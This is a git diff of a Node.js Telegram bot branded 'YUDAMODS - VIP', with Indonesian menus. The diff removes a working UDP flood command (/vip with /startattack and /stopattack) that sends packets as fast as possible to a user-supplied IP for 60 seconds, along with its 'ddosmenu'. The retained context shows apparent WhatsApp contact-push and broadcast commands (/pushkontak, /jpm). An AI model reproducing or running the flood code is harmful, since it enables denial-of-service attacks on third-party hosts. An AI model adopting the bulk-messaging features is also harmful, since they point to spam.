@@ -5,11 +5,10 @@ const cheerio = require('cheerio');
 const figlet = require('figlet');
 const chalk = require('chalk');
 const fs = require('fs');
-const util = require('util');
 const { watchFile, unwatchFile } = fs;
 const { fileURLToPath } = require('url');
 const dgram = require('dgram');
-const translate = require('translate-google');
+const util = require('util');
 
 const bot = new Telegraf(TELEGRAM_BOT_TOKEN);
 
@@ -59,58 +58,6 @@ bot.command('bc', (ctx) => {
     }
 });
 
-bot.command('vip', (ctx) => {
-    const chatId = ctx.chat.id;
-    const vipText = ctx.message.text ? ctx.message.text.toLowerCase() : '';
-    const caption = ctx.message.caption ? ctx.message.caption.toLowerCase() : '';
-
-    if ((vipText === '/startattack' || caption.startsWith('/startattack')) && !attacking) {
-        attacking = true;
-
-        const targetIPMatch = caption.match(/\/startattack\s+([\d.]+)/);
-        const targetIP = targetIPMatch ? targetIPMatch[1] : '0.0.0.0';
-        const targetPort = 80; // Change to your target port
-        const duration = 60; // Attack duration in seconds
-
-        const socket = dgram.createSocket('udp4');
-        const vip = Buffer.from('A'); // UDP payload
-
-        let startTime = Date.now();
-        const endTime = startTime + (duration * 1000);
-
-        console.log(`Starting UDP flood attack on ${targetIP}:${targetPort} for ${duration} seconds`);
-
-        const sendPacket = () => {
-            if (attacking) {
-                socket.send(vip, targetPort, targetIP, (err) => {
-                    if (err) {
-                        console.error(err);
-                    }
-                });
-
-                if (Date.now() < endTime) {
-                    setTimeout(sendPacket, 1); // Send packets as fast as possible
-                } else {
-                    console.log('Attack completed');
-                    attacking = false;
-                    socket.close();
-                }
-            }
-        };
-
-        sendPacket();
-
-        ctx.reply(`UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
-    } else if (vipText === '/stopattack' && attacking) {
-        attacking = false;
-        ctx.reply('Attack stopped');
-    } else {
-        ctx.reply('Perintah tidak valid.');
-    }
-});
-
-
-
 bot.command('jpm', (ctx) => {
     const jpmMessage = ctx.message.text.split(' ').slice(1).join(' ');
 
@@ -129,31 +76,6 @@ bot.command('jpm', (ctx) => {
             break;
     }
 });
-
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const messageText = msg.text;
-
-    // Check the command using switch-case structure
-    switch (messageText.split(' ')[0]) {
-        case '/translate':
-            try {
-                // Extract the text to translate from the message
-                const textToTranslate = messageText.replace('/translate ', '');
-
-                // Translate the text from English to Spanish
-                const translatedText = await translate(textToTranslate, {to: 'es'});
-                bot.sendMessage(chatId, `Translated: ${translatedText}`);
-            } catch (error) {
-                bot.sendMessage(chatId, 'Error translating message.');
-            }
-            break;
-        default:
-            break;
-    }
-});
-
-
 
 bot.on('text', async (ctx) => {
   const message = ctx.message.text;
@@ -180,8 +102,6 @@ bot.on('text', async (ctx) => {
 ┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
 ┃⿻ /pushkontakmenu
 ┃⿻ /allmenu
-┃⿻ /ddosmenu
-┃⿻ /translatemenu
 ┗━━━━━[ YUDAMODS  ]━━━━
        
           ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
@@ -215,67 +135,12 @@ bot.on('text', async (ctx) => {
 ┃⿻ /pushkontak
 ┃⿻ /jpm
 ┃⿻ /bc
-┃⿻ /owner
 ┗━━━━━[ YUDAMODS  ]━━━━
        
           ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
       ctx.replyWithPhoto(thumbPath, { caption: allmenuText });
       break;
       
-      
-      case '/translatemenu':
-      const translateText = `${greeting} Kak ${name}!
-
-╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
-├ Nama = ${name}
-├ Tag = ${tag}
-╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
-╠ Nama Bot = YUDAMODS - VIP
-├ Owner = @YUDAMODS
-├ Founder = @YUDAMODS
-╰──❏「 YUDAMODS  」❏
-
-┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
-┃⿻ /translate
-┗━━━━━[ YUDAMODS  ]━━━━
-       
-          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
-      ctx.replyWithPhoto(thumbPath, { caption: translateText });
-      break;
-      
-      case '/ddosmenu':
-      const ddosText = `${greeting} Kak ${name}!
-
-╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
-├ Nama = ${name}
-├ Tag = ${tag}
-╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
-╠ Nama Bot = YUDAMODS - VIP
-├ Owner = @YUDAMODS
-├ Founder = @YUDAMODS
-╰──❏「 YUDAMODS  」❏
-
-┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
-┃⿻ /startattack
-┃⿻ /stopattack
-┗━━━━━[ YUDAMODS  ]━━━━
-       
-          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
-      ctx.replyWithPhoto(thumbPath, { caption: ddosText });
-      break;
-
-    case '/pushkontakmenu':
-    const keyboard = {
-        reply_markup: {
-            keyboard: [
-                [{ text: '/lanjutkan' }]
-            ],
-            resize_keyboard: true
-        }
-    };
-    
-    ctx.replyWithPhoto(thumbPath, { caption: `Anda yakin dengan pilihan Anda? Whatsapp Anda dapat diblokir jika baru saja menautkan dengan bot. Silahkan ketik /lanjutkan untuk melanjutkan.`, keyboard });
-    break;
 
     case '/pushkontak':
     const pushkontakArgs = message.split(' ').slice(1).join(' ');
@@ -318,11 +183,6 @@ bot.on('text', async (ctx) => {
         ctx.replyWithPhoto(thumbPath, { caption: `Terjadi kesalahan: ${error.message}` });
     }
     break;
-    
-    case '/owner':
-      // Mengirim link Telegram Anda dalam format kontak
-      ctx.replyWithContact({ phone_number: 't.me/YUDAMODS', first_name: 'YUDAMODS' });
-      break;
 
     case '/lanjutkan':
         const lanjutkanText = `${greeting} Kak ${name}!
